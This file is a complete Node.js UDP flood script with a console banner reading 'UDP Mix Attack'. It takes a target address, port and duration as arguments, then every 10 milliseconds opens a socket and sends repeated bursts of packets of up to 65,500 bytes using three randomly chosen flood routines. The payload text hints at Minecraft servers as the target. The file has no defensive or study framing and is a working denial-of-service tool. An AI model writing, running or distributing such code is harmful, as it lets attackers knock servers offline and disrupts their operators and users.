const dgram = require('dgram');

const target = process.argv[2];
const port = process.argv[3];
const duration = process.argv[4];

function generatePayload(size) {
    let payload = Buffer.alloc(size);
    payload.fill('MCLightUDP');
    return payload;
}

// Generate different payload sizes
const payloads = [
    generatePayload(512),     // Small payload
    generatePayload(1024),    // Medium payload
    generatePayload(4096),    // Large payload
    generatePayload(65500)    // Maximum UDP payload
];

// Different UDP flood techniques
function standardFlood(socket, payload) {
    for (let i = 0; i < 25; i++) {
        socket.send(payload, 0, payload.length, port, target);
    }
}

function burstFlood(socket, payload) {
    for (let i = 0; i < 50; i++) {
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
    }
}

function randomizedFlood(socket) {
    const randomPayload = payloads[Math.floor(Math.random() * payloads.length)];
    for (let i = 0; i < 35; i++) {
        socket.send(randomPayload, 0, randomPayload.length, port, target);
    }
}

// Main attack loop
setInterval(() => {
    const socket = dgram.createSocket('udp4');
    
    // Randomly choose attack method
    const attackMethod = Math.floor(Math.random() * 3);
    
    switch(attackMethod) {
        case 0:
            standardFlood(socket, payloads[0]);
            break;
        case 1:
            burstFlood(socket, payloads[2]);
            break;
        case 2:
            randomizedFlood(socket);
            break;
    }

    socket.on('error', (err) => {
        console.error('Socket error:', err);
        socket.close();
    });
}, 10);

console.clear();
console.log(`
╔══════════════════════════════════════════╗
║             UDP Mix Attack               ║
║------------------------------------------║
║ Target: ${target}
║ Port: ${port}
║ Duration: ${duration} seconds
║ Status: Running...
╚══════════════════════════════════════════╝
`);

setTimeout(() => {
    console.log('Attack completed.');
    process.exit(0);
}, duration * 1000); 